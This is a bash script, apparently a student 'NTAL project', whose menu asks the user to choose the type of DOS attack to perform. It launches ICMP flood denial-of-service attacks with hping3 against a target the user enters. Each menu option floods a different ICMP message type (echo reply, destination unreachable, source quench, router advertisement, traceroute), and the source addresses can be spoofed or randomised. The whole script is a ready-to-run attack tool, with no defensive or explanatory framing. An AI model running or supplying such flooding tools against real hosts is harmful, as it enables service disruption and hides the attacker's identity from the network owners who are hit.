#!/bin/bash
PS3="GG>"

mainmenu()
{
dosmenu
}

##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("ICMP Echo Flood" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Flood
	if [ "$dosopt" = "ICMP Echo Flood" ]; then
		icmpflood
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		exit 0
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done

}

##END DOSMENU##
###############

###################
##START ICMPFLOOD##
icmpflood()
{

dosmenu=("Echo Reply" "Destination Unreachable" "Source Quench" "Router advertisement" "Traceroute")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Reply
	if [ "$dosopt" = "Echo Reply" ]; then
		echoreply
#ICMP Destination Unreachable
	elif [ "$dosopt" = "Destination Unreachable" ]; then
		destinationunreachable
#ICMP Source Quench
 	elif [ "$dosopt" = "Source Quench" ]; then
		sourcequench
#ICMP Router advertisement
	elif [ "$dosopt" = "Router advertisement" ]; then
  routeradvertisement
#ICMP Traceroute
	elif [ "$dosopt" = "Traceroute" ]; then
		traceroute
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		exit 0
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done
}
##END ICMPFLOOD##
#################	

#################
##ECHO REPLY#####
echoreply()
{		
		echo "Preparing to launch ICMP Echo Reply"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood $TARGET
	fi
}
##END ECHO REPLY##
##################


###################################
##DESTINATION UNREACHABLE##########
destinationunreachable()
{		
		echo "Preparing to launch ICMP Destination Unreacheable"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	fi
}
##END ICMP DESTINATION UNREACHABLE##
####################################


#########################
##SOURCE QUENCH##########
sourcequench()
{		
		echo "Preparing to launch ICMP Source Quench"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood $TARGET
	fi
}
##END SOURCE QUENCH##
#####################

#########################
##ROUTER ADVERTISEMENT##########
routeradvertisement()
{		
		echo "Preparing to launch ICMP Router Advertisement"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP SRouter Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood $TARGET
	fi
}
##END ROUTER ADVERTISEMENT##
#####################

#########################
##TRACEROUTE##########
traceroute()
{		
		echo "Preparing to launch ICMP Traceroute"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP STraceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood $TARGET
	fi
}
##END TRACEROUTE##
#####################

###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""

echo -e "\n"
figlet -f cosmic "GG"
echo -e "\n"

echo "Welcome to our NTAL project!!"
echo "Choose the type of DOS attack to be performed"
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##